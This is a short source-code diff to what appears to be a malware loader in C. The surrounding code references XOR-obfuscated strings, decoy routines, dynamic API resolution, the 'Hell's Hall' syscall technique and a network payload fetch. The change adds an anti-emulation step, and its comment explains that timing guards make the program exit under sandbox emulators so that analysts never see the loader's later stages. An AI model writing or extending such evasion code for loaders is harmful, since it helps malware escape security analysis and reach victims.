@@ -20,6 +20,7 @@
 #  include "api_table.h"
 #  include "xor_string.h"
 #  include "decoys.h"
+#  include "anti_emu.h"
 #else
 #  include <stdlib.h>
 #endif
@@ -67,6 +68,13 @@ void __attribute__((noreturn)) stage1_entry(void)
      * Behaviour-neutral; result is sunk into a volatile. */
     static volatile uint32_t decoy_sink;
     decoy_sink ^= decoys_run();
+
+    /* S40: timing-based execution-environment guards. On real hardware
+     * this adds a ~9.5 s quiet window before the rest of the loader
+     * runs. Under Sleep-skip or iteration-bounded emulators it self-
+     * terminates with ExitProcess(0), so resolve_apis()/Hell's Hall/
+     * the network fetch never run. */
+    anti_emu_run();
 
     if (resolve_apis() != 0) goto done;
     if (!config_valid(&g_config)) goto done;
